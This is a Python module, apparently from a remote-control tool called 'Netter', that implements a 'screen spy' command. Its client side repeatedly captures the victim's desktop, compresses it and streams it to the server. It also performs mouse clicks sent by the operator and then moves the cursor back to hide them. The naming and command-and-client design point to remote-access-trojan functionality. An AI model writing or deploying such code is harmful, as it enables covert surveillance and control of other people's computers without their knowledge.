import io, pyautogui, threading
import io

from PIL import ImageGrab, ImageTk, Image
from typing import TYPE_CHECKING
from zlib import compress, decompress
import tkinter as tk

from ..enums import PacketType
from ..commands import CommandBase

from typing import Callable

if TYPE_CHECKING:
    from ..http import NetterServer, NetterClient
    from ..enums import ClientResponse
    from ..client.connect import Connect


class tkinterWindow(tk.Tk):
    WINDOW_WIDHT = 1280
    WINDOW_HEIGHT = 720

    def __init__(self, on_close: Callable, netServer: "NetterServer", client: "NetterClient"):
        super().__init__()
        self.title("Screen Spy")
        self.geometry(f"{self.WINDOW_WIDHT}x{self.WINDOW_HEIGHT}")

        self.screenResolution = list(map(int, client.screenResolution.split("x")))
        self.ratio_x = self.screenResolution[0] / self.WINDOW_WIDHT
        self.ratio_y = self.screenResolution[1] / self.WINDOW_HEIGHT

        self.netServer = netServer
        self.on_close = on_close
        self.client = client
        self.image_id = None
        self.currentimg = None

        self.canvas = tk.Canvas(self)
        self.canvas.bind("<Button-1>", self.left_click)
        self.canvas.pack(fill="both", expand=True)
        self.protocol("WM_DELETE_WINDOW", self.on_close)
        self.bind("<Configure>", self.on_resize)
        # self.mouseListener.start()

    def change_image(self, data):
        self.currentimg = data

        try:
            self.frame = ImageTk.PhotoImage(self.currentimg)

        except ValueError:
            return

        if self.image_id is None:
            self.image_id = self.canvas.create_image(0, 0, anchor="nw", image=self.frame)
        else:
            self.canvas.itemconfig(self.image_id, image=self.frame)

    def left_click(self, event):
        widget_under_cursor = self.winfo_containing(event.x_root, event.y_root)

        if widget_under_cursor is not None and widget_under_cursor == self.canvas:
            x, y = self.canvas.canvasx(event.x), self.canvas.canvasy(event.y)
            adjusted_x, adjusted_y = int(x * self.ratio_x), int(y * self.ratio_y)
            self.client.socket_.send_(packetType=PacketType.COMMAND, data=("spy", (adjusted_x, adjusted_y)))

    def on_resize(self, event):
        self.WINDOW_WIDHT = event.width
        self.WINDOW_HEIGHT = event.height
        self.ratio_x = self.screenResolution[0] / self.WINDOW_WIDHT
        self.ratio_y = self.screenResolution[1] / self.WINDOW_HEIGHT
        self.change_image(self.currentimg)


class screenSpyCommand(CommandBase):
    __aliases__ = ["spy", "screenspy"]
    __description__ = "Take a screenshot from the client desktop"
    __extra__ = "Usage: `screenshot <Client ID>` | The screenshot will be saved to `client` directory"

    isRunning = False
    tkObject = None

    def execute(self, netServer: "NetterServer", clientID: str) -> "NetterClient":
        if self.isRunning:
            netServer.console_log("Screen spying is already running", level="ERROR")
            return

        # if not args and not netServer.selectedClient:
        #     # netServer.console_log('No client selected', level = 'ERROR')
        #     netServer.inputHandler.handle("help spy")
        #     return

        selectedClient = netServer.selectedClient if netServer.selectedClient else netServer.get(UUID=clientID)

        if selectedClient is None:
            netServer.console_log("Provided client does not exist.", level="ERROR")
            return

        self.isRunning = True

        def on_close():
            self.isRunning = False
            selectedClient.socket_.send_(packetType=PacketType.COMMAND, data="spy")  # Trigger once more to stop sending
            self.tkObject.destroy()

        def run_ui():
            self.tkObject = tkinterWindow(on_close=on_close, netServer=netServer, client=selectedClient)
            self.tkObject.mainloop()

        threading.Thread(target=run_ui, daemon=True).start()
        return selectedClient

    def on_server_receive(self, netServer: "NetterServer", client: "NetterClient", packet: "ClientResponse") -> None:
        # self.tkObject.change_image(io.BytesIO(decompress(packet.data)))

        if self.tkObject:
            data = io.BytesIO(decompress(packet.data))
            self.tkObject.after(
                0, self.tkObject.change_image, Image.open(data).resize((self.tkObject.WINDOW_WIDHT, self.tkObject.WINDOW_HEIGHT))
            )

    def on_client_receive(self, serverHandler: "Connect", *args):
        if not args:
            self.isRunning = not self.isRunning
        else:
            old_x, old_y = pyautogui.position()

            pyautogui.moveTo(x=args[0][0], y=args[0][1])
            # time.sleep(0.1)
            pyautogui.click()

            pyautogui.moveTo(x=old_x, y=old_y)

        while self.isRunning:
            yield self.capture_screen()

    def capture_screen(self) -> bytes:
        screenshot = ImageGrab.grab()
        screenshot = screenshot.convert("RGB")

        byteArray = io.BytesIO()
        screenshot.save(byteArray, format="JPEG")

        data = compress(byteArray.getvalue())
        return data
